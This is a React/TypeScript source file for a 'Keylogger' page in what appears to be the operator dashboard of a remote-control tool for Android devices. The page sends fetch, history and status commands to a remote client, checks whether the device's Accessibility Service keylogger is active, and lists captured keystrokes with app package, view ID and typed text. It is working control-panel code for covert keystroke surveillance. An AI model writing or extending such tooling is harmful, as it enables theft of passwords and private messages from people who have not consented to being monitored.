import { useCallback, useEffect, useState, useRef } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, KeystrokeEntry } from '@/types';
import { CMD, normalizeKeystrokeList, extractList } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Keyboard, Download, Activity } from 'lucide-react';
import { clientsApi } from '@/services/api';

interface KeyloggerStatus {
  enabled: boolean | null;
  queued: number;
  checkedAt: string | null;
}

export default function KeyloggerPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();

  const { data: keystrokes, loading, error, refresh, sendCommand, commandStatus } = useDeviceData<KeystrokeEntry[]>({
    clientId,
    page: 'keylogger',
    extractData: (d) => normalizeKeystrokeList(extractList(d.list)),
    dataType: ['keylogger', 'keylogger_status'],
    defaultValue: [],
    // Giảm debounce xuống 500ms để giảm độ trễ end-to-end
    socketDebounceMs: 500,
  });

  // Trạng thái keylogger service (poll từ API)
  const [keyloggerStatus, setKeyloggerStatus] = useState<KeyloggerStatus>({
    enabled: null,
    queued: 0,
    checkedAt: null,
  });
  const [statusLoading, setStatusLoading] = useState(false);
  const statusTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Tự động fetch trạng thái khi vào trang
  const fetchStatus = useCallback(async () => {
    setStatusLoading(true);
    try {
      const res = await clientsApi.getPage(clientId, 'keylogger_status');
      if (res.data.success && res.data.data) {
        const d = res.data.data as Record<string, unknown>;
        setKeyloggerStatus({
          enabled: typeof d.enabled === 'boolean' ? d.enabled : null,
          queued: typeof d.queued === 'number' ? d.queued : 0,
          checkedAt: typeof d.checkedAt === 'string' ? d.checkedAt : null,
        });
      }
    } catch {
      // Không hiển thị lỗi — chỉ để trống
    } finally {
      setStatusLoading(false);
    }
  }, [clientId]);

  // Gửi lệnh status đến thiết bị để cập nhật trạng thái mới nhất
  const checkServiceStatus = useCallback(async () => {
    setStatusLoading(true);
    try {
      await sendCommand(CMD.KEYLOGGER, { action: 'status' });
    } catch {
      // sendCommand tự hiển thị lỗi qua commandStatus
    }
    // Fetch sau 1.5s để đợi socket broadcast; có finally trong fetchStatus nên loading luôn được clear
    const timer = setTimeout(() => {
      fetchStatus();
    }, 1500);
    // Store for cleanup
    statusTimerRef.current = timer;
  }, [sendCommand, fetchStatus]);

  useEffect(() => {
    fetchStatus();
    return () => {
      if (statusTimerRef.current) clearTimeout(statusTimerRef.current);
    };
  }, [fetchStatus]);

  const fetchKeylogger = useCallback(async () => {
    try {
      await sendCommand(CMD.KEYLOGGER, { action: 'fetch' });
    } catch {
      // Lỗi đã được hiển thị qua commandStatus
    }
  }, [sendCommand]);

  const getHistory = useCallback(async () => {
    try {
      await sendCommand(CMD.KEYLOGGER, { action: 'getHistory' });
    } catch {
      // Lỗi đã được hiển thị qua commandStatus
    }
  }, [sendCommand]);

  const formatCheckedAt = (iso: string | null): string => {
    if (!iso) return '';
    try {
      return new Date(iso).toLocaleString();
    } catch {
      return iso;
    }
  };

  // Badge trạng thái service
  const statusBadge = () => {
    if (keyloggerStatus.enabled === null) {
      return <Badge variant="outline" className="text-[10px] border-gray-400/30 text-gray-500">UNKNOWN</Badge>;
    }
    if (keyloggerStatus.enabled) {
      return <Badge variant="outline" className="text-[10px] border-green-400/30 text-green-600">ACTIVE</Badge>;
    }
    return <Badge variant="outline" className="text-[10px] border-red-400/30 text-red-600">DISABLED</Badge>;
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Keylogger"
        subtitle={`${keystrokes.length} events`}
        actions={[
          { label: 'Fetch', icon: Download, onClick: fetchKeylogger, disabled: loading || !online },
          { label: 'Get History', icon: Keyboard, onClick: getHistory, disabled: loading || !online, variant: 'outline' as const },
          { label: 'Check Status', icon: Activity, onClick: checkServiceStatus, disabled: statusLoading || !online, variant: 'outline' as const },
        ]}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {/* Trạng thái Accessibility Service */}
      <Card className="shadow-none border-dashed">
        <CardContent className="p-3 flex items-center gap-3 flex-wrap">
          <span className="text-xs font-medium text-muted-foreground">Accessibility Service:</span>
          {statusBadge()}
          {keyloggerStatus.enabled !== null && (
            <span className="text-[10px] text-muted-foreground">
              Queued: {keyloggerStatus.queued} entries
            </span>
          )}
          {keyloggerStatus.checkedAt && (
            <span className="text-[9px] text-muted-foreground/60">
              Last check: {formatCheckedAt(keyloggerStatus.checkedAt)}
            </span>
          )}
          <button
            onClick={fetchStatus}
            disabled={statusLoading}
            className="text-[10px] text-blue-500 hover:text-blue-600 ml-auto disabled:opacity-50"
          >
            Refresh status
          </button>
        </CardContent>
      </Card>

      {error && <ErrorAlert message={error} onRetry={refresh} />}

      {loading && !error ? (
        <LoadingSkeleton rows={4} />
      ) : keystrokes.length === 0 ? (
        <EmptyState
          icon={Keyboard}
          title="No keystroke data"
          description="Click Fetch to retrieve buffered keystrokes, or Get History for stored data"
          action={{ label: 'Fetch Keystrokes', onClick: fetchKeylogger, disabled: loading || !online, loading: commandStatus === 'sending' }}
        />
      ) : (
        <div className="space-y-2">
          {keystrokes.map((item, i) => (
            <Card key={`ks-${item.timestamp}-${i}`} className="shadow-none">
              <CardContent className="p-3">
                <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                  <Badge variant="outline" className={`text-[9px] px-1 py-0 ${
                    item.type === 'offline' ? 'border-blue-400/30 text-blue-500' :
                    item.type === 'history' ? 'border-amber-400/30 text-amber-600' :
                    'border-green-400/30 text-green-500'
                  }`}>
                    {item.type === 'offline' ? 'OFFLINE' : item.type === 'history' ? 'HISTORY' : 'LIVE'}
                  </Badge>
                  {item.eventType && (
                    <Badge variant="secondary" className="text-[9px] px-1 py-0">{item.eventType}</Badge>
                  )}
                  {item.timestamp && (
                    <span className="text-[10px] text-muted-foreground">{item.timestamp}</span>
                  )}
                </div>
                {item.pkg && <p className="text-[10px] font-mono text-muted-foreground truncate">pkg: {item.pkg}</p>}
                {item.cls && <p className="text-[10px] font-mono text-muted-foreground truncate">cls: {item.cls}</p>}
                {item.viewId && <p className="text-[10px] font-mono text-muted-foreground truncate">viewId: {item.viewId}</p>}
                {(item.text || item.content) && (
                  <p className="font-mono text-xs break-all bg-muted/50 rounded p-2 mt-1">
                    {item.text || item.content}
                  </p>
                )}
                {item.extra && (
                  <p className="text-[9px] font-mono text-muted-foreground/60 break-all mt-0.5">extra: {item.extra}</p>
                )}
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
}
